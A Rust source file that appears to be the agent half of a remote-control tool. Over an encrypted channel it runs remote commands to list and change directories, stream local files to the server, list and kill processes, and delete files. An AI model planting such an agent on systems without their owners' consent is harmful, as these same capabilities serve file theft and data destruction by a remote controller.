use std::collections::HashMap;
use std::error::Error;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::SystemTime;
use std::{env, thread};

use common::cipher::encryption::Cipher;
use common::config;
use common::errors::RuntimeError;
use common::payloads::custom::cancel::Cancel;
use common::payloads::custom::request::{Request, RequestType};
use common::payloads::custom::response::{
    Entry, EntryMetadata, ProcessEntry, Response, ResponseType,
};
use common::payloads::PayloadFormat;
use common::utils::{format_bytes, wait_for};
use log::{error, info, warn};
use sysinfo::{
    Pid, ProcessRefreshKind, ProcessesToUpdate, Signal, System, MINIMUM_CPU_UPDATE_INTERVAL,
};
use tokio::fs::{self, read_dir};
use tokio::io::AsyncReadExt;
use tokio::sync::Mutex;
use tokio::{signal, task};

use crate::broadcast::BroadcastLayer;

async fn pwd<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Requesting current directory");

    let payload = Response::response_request(
        payload,
        ResponseType::Pwd {
            path: env::current_dir()?,
        },
    );
    ptr.send(&payload).await?;

    Ok(())
}

async fn ls<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
    path: PathBuf,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Listing directory {}", path.to_string_lossy());

    let mut entries = read_dir(&path).await?;
    let mut result = vec![];
    while let Ok(Some(entry)) = entries.next_entry().await {
        let file_name = entry.file_name().to_string_lossy().into_owned();
        let file_type = match entry.file_type().await {
            Ok(t) => {
                if t.is_dir() {
                    "dir"
                } else if t.is_file() {
                    "file"
                } else if t.is_symlink() {
                    "symlink"
                } else {
                    "unknown"
                }
            }
            Err(_) => "unknown",
        };
        let metadata = entry
            .metadata()
            .await
            .map(|m| EntryMetadata {
                created_at: m.created().unwrap_or(SystemTime::UNIX_EPOCH),
                modified_at: m.modified().unwrap_or(SystemTime::UNIX_EPOCH),
                size: m.len(),
            })
            .ok();

        result.push(Entry {
            file_name,
            file_type: file_type.to_string(),
            metadata,
        })
    }

    let payload = Response::response_request(payload, ResponseType::Ls { entries: result });
    ptr.send(&payload).await?;

    Ok(())
}

async fn cd<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
    path: PathBuf,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Changing directory to {}", path.to_string_lossy());

    env::set_current_dir(path)?;

    let payload = Response::response_request(payload, ResponseType::Success);
    ptr.send(&payload).await?;

    Ok(())
}

async fn download<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
    path: PathBuf,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    const CHUNK_SIZE: usize = 8192;
    info!("Uploading file {} to server", path.to_string_lossy());

    let mut file = fs::File::open(&path).await?;
    let total = file.metadata().await?.len();
    let mut sent = 0;
    let mut received = 0;

    loop {
        let mut buf = vec![0; CHUNK_SIZE];

        let read_size = file.read(&mut buf).await?;
        if read_size == 0 {
            info!(
                "File upload complete: {} {}",
                format_bytes(total),
                path.to_string_lossy(),
            );

            let payload = Response::response_request(
                payload,
                ResponseType::DownloadChunk {
                    total,
                    data: vec![],
                },
            );
            ptr.send(&payload).await?;
            break;
        } else {
            buf.truncate(read_size);
            let payload = Response::response_request(
                payload,
                ResponseType::DownloadChunk { total, data: buf },
            );
            ptr.send(&payload).await?;

            sent += read_size;
        }

        if sent >= received + config::ACK_CHUNKS_COUNT * CHUNK_SIZE {
            let mut receiver = ptr.subscribe();
            let r_id = payload.request_id();
            received = wait_for(&mut receiver, async |packet| {
                if let Ok(request) = Request::from_packet(&packet).await {
                    if let RequestType::DownloadAck {
                        request_id,
                        received,
                    } = request.rtype()
                    {
                        if *request_id == r_id {
                            return Some(*received);
                        }
                    }
                }

                None
            })
            .await as usize;
        }
    }

    Ok(())
}

async fn ps<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Listing all system processes");

    let task = task::spawn_blocking(|| {
        let mut system = System::new_all();

        thread::sleep(MINIMUM_CPU_UPDATE_INTERVAL);
        system.refresh_processes_specifics(
            ProcessesToUpdate::All,
            true,
            ProcessRefreshKind::nothing().with_cpu(),
        );
        let mut processes = vec![];
        for (pid, process) in system.processes() {
            processes.push(ProcessEntry {
                pid: u64::from(pid.as_u32()),
                accumulated_cpu_time: process.accumulated_cpu_time(),
                cmd: process
                    .cmd()
                    .iter()
                    .map(|s| s.to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
                    .join(" "),
                cpu_usage: process.cpu_usage(),
                memory: process.memory(),
                name: process.name().to_string_lossy().into_owned(),
                run_time: process.run_time(),
            });
        }

        processes
    });

    let payload = Response::response_request(
        payload,
        ResponseType::Ps {
            processes: task.await?,
        },
    );
    ptr.send(&payload).await?;

    Ok(())
}

async fn kill<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
    pid: u64,
    signal: String,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Killing process {} with signal {:?}", pid, signal);
    let signal = match signal.to_uppercase().as_str() {
        "TERM" => Ok(Signal::Term),
        "KILL" => Ok(Signal::Kill),
        s => Err(RuntimeError::new(format!("Unsupported signal {:?}", s))),
    }?;

    let system = System::new_all();
    let process = system
        .process(Pid::from(pid as usize))
        .ok_or_else(|| RuntimeError::new("Process not found"))?;

    process.kill_with(signal);
    ptr.send(&Response::response_request(payload, ResponseType::Success))
        .await?;
    Ok(())
}

async fn rm<C>(
    ptr: Arc<BroadcastLayer<C>>,
    payload: &Request,
    path: PathBuf,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    info!("Removing {}", path.to_string_lossy());

    let metadata = fs::symlink_metadata(&path).await?;
    if metadata.is_dir() {
        fs::remove_dir(&path).await?;
    } else {
        fs::remove_file(&path).await?;
    }

    let payload = Response::response_request(payload, ResponseType::Success);
    ptr.send(&payload).await?;

    Ok(())
}

pub async fn _poll_packets<C>(
    ptr: Arc<BroadcastLayer<C>>,
) -> Result<(), Box<dyn Error + Send + Sync>>
where
    C: Cipher + 'static,
{
    let mut receiver = ptr.subscribe();
    let tasks = Arc::new(Mutex::new(HashMap::new()));

    loop {
        tokio::select! {
            _ = ptr.wait_until_exit() => {
                break;
            }
            Ok(packet) = receiver.recv() => {
                if let Ok(request) = Request::from_packet(&packet).await {
                    let c_ptr = ptr.clone();
                    macro_rules! cmd_handler {
                        ($handler:ident $(, $args:expr)*) => {
                            let mut tasks = tasks.lock().await;

                            let request_src = request.src();
                            let request_id = request.request_id();

                            let task = tokio::spawn(async move {
                                if let Err(e) = $handler(c_ptr.clone(), &request $(, $args)*).await {
                                    let message =
                                        format!("Error handling request {}: {}", request_id, e);
                                    error!("{}", message);

                                    let payload = Response::response_request(
                                        &request,
                                        ResponseType::Error { message },
                                    );
                                    let _ = c_ptr.send(&payload).await;
                                }
                            });
                            tasks.insert((request_src, request_id), task);
                        };
                    }

                    let rtype = request.rtype().clone();
                    match rtype {
                        RequestType::Pwd => {
                            cmd_handler!(pwd);
                        }
                        RequestType::Ls { path } => {
                            cmd_handler!(ls, path.clone());
                        }
                        RequestType::Cd { path } => {
                            cmd_handler!(cd, path.clone());
                        }
                        RequestType::Download { path } => {
                            cmd_handler!(download, path.clone());
                        }
                        RequestType::DownloadAck { .. } => {
                            // Used internally by download handler
                        }
                        RequestType::Ps => {
                            cmd_handler!(ps);
                        }
                        RequestType::Kill { pid, signal } => {
                            cmd_handler!(kill, pid, signal);
                        }
                        RequestType::Rm { path } => {
                            cmd_handler!(rm, path.clone());
                        }
                    }
                } else if let Ok(cancel) = Cancel::from_packet(&packet).await {
                    info!(
                        "Received cancel request from {}:{}",
                        cancel.src(),
                        cancel.request_id()
                    );

                    let mut tasks = tasks.lock().await;
                    if let Some(task) = tasks.remove(&(cancel.src(), cancel.request_id())) {
                        task.abort();
                        if let Err(e) = ptr
                            .send(&Response::new(
                                cancel.request_id(),
                                cancel.src(),
                                ptr.local_addr(),
                                ResponseType::Error {
                                    message: "Request cancelled".to_string(),
                                },
                            ))
                            .await
                        {
                            error!("Failed to send cancel response: {}", e);
                        }
                    } else {
                        warn!("No task found for {}:{}", cancel.src(), cancel.request_id());
                    }
                }
            }
        }
    }

    Ok(())
}

pub async fn listen_loop<C>(ptr: Arc<BroadcastLayer<C>>)
where
    C: Cipher + 'static,
{
    let _ptr = ptr.clone();
    let task = tokio::spawn(_poll_packets(_ptr));

    let _ = signal::ctrl_c().await;
    info!("Received Ctrl+C, shutting down...");

    ptr.exit().await;
    if let Err(e) = task.await {
        error!("Error in listen loop: {}", e);
    }
}
